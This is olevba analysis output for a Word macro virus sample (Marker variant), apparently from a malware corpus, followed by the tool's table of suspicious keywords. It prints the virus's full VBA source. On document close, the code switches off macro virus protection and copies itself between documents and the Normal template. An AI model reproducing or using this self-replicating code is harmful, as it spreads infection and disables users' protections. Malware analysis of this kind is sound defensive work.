olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.n-cad6ffbfc745012783fb04280313e9aaa85a8db2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.n-cad6ffbfc745012783fb04280313e9aaa85a8db2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub ToolsMacro()
Private Sub Document_Close()
On Error Resume Next
Const ID = "xyzzy"
Dim hdlskk As Boolean
Dim ijnff, iitgh As Object
Dim zmbbcxx As String
Set ijnff = ActiveDocument.VBProject.VBComponents.Item(1)
Set iitgh = NormalTemplate.VBProject.VBComponents.Item(1)
Options.VirusProtection = False
If (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
If ijnff.CodeModule.Find(ID, 1, 1, 10000, 10000) = True Then
hdlskk = NormalTemplate.Saved
zmbbcxx = ijnff.CodeModule.Lines(1, ijnff.CodeModule.CountOfLines)
iitgh.CodeModule.deletelines 1, iitgh.CodeModule.CountOfLines
iitgh.CodeModule.AddFromString zmbbcxx
If hdlskk = True Then NormalTemplate.Save
End If
If iitgh.CodeModule.Find(ID, 1, 1, 10000, 10000) = True And (Mid(ActiveDocument.FullName, 2, 1) = ":" Or ActiveDocument.Saved = False) Then
zmbbcxx = iitgh.CodeModule.Lines(1, iitgh.CodeModule.CountOfLines)
ijnff.CodeModule.deletelines 1, ijnff.CodeModule.CountOfLines
ijnff.CodeModule.AddFromString zmbbcxx
End If
If Rnd < 0.3 Then With Dialogs(wdDialogFileSummaryInfo): .Title = "Ethan Frome": .Author = "EW/LN/CB": .Keywords = "Ethan": .Execute: End With
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
